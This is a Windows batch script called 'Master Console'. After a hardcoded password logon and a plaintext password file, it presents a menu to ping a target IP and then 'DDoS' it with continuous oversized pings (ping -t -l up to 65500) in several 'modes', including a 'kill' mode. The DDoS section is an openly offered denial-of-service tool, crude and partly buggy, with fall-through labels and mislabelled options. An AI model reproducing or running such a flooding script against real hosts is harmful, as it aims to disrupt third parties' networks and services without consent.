 @echo off
Title Master Console
:top 
cls
echo                                       LOGON
echo. 
set /p pass=Enter password: 
if "%pass%"=="Nexenti" goto good 
goto top 
:good 
echo -Create Password (create)
echo.
echo -Proceed Password (proceed)
echo.
echo -Show Created Password (show)
echo.
echo -Exit (Exit)
echo.
set /p PROGRAM= Which Program Do You Wish To Run?:
goto %PROGRAM%

"VARIABLES"

:create
set /p PASSWORD= what do you want your password to be?
echo %PASSWORD% > Master-Created-Password.txt
cls
echo Do you wish to display stored password?
set /p sh01= yes or no?
if "%sh01%"=="yes" goto shoDISPLAY
cls
goto good


:shoDISPLAY
start Master-Created-Password.txt
cls
goto good


:show
start Master-Created-Password.txt
cls
echo Error No stored password named (Master-Created-Password.txt) was found
pause
cls
goto good

"END OF VARIABLE LIST"

:proceed
cls
set /p PASSWORD1= What is your set password?

for /f "Delims=" %%a in (Master-Created-Password.txt) do (

set TEXT=%%a

)

if %PASSWORD1%==%TEXT% goto correct
color 4
cls
echo You have entered an invalid password hence entrance denied.
pause
goto good
:correct
color a
echo Your access is accepted, please press any button to Continue.
pause
goto :maindoor


:maindoor
color 08
cls
echo.
echo              MAIN GATE
echo.
echo ____________________________________________________________________
echo.
echo -Ping Targeted Ip (command: aVaPortCheck)
echo.
echo -DDos a targeted Ip adress (command: ddos)
echo.
echo -Back (command: back)
echo.
echo ____________________________________________________________________
echo.
set /p CHOISE01=Chose option 
if %CHOISE01%==aVaPortCheck goto Pport
if %CHOISE01%==ddos goto Slowthem
if %CHOISE01%==back goto good
goto maindoor




:Pport
set /p PP= Please enter the Ip you wish to ping
ping %PP%
pause
echo Do you wish to ddos this targeted ip? (if 0% loss)
set /p sh02= yes or no?
if "%sh02%"=="yes" goto Slowthem
cls
goto maindoor









:Slowthem
cls
echo                       DDOS MENU
echo.
set /p IPINFO= Please state targeted ip, press Ctrl + C to stop DDos
echo.
echo.
echo -DDos target with 15,000 Bit (command: 15)
echo.
echo.
echo -DDos target with 30,00 Bit (command: 30)
echo.
echo.
echo -DDos target with 40,00 Bit (command: 40)
echo.
echo.
echo DDos target with Maximum Bit (command: kill)
set /p DDOSOP=Please state ddos mode 15,30,40 or Kill mode?
if %DDOSOP%==15 goto ddos1
if %DDOSOP%==30 goto ddos2
if %DDOSOP%==40 goto ddos3
if %DDOSOP%==kill goto ddos4



:ddos1
color 0F
cls
ping %IPINFO% -t -l 15000




:ddos2
color 0F
cls
ping %IPINFO% -t -l 30000





:ddos3
color 0F
cls
ping %IPINFO% -t -l 40000



:ddos4
color 0F
cls
color
ping %IPINFO% -t -l 65500



















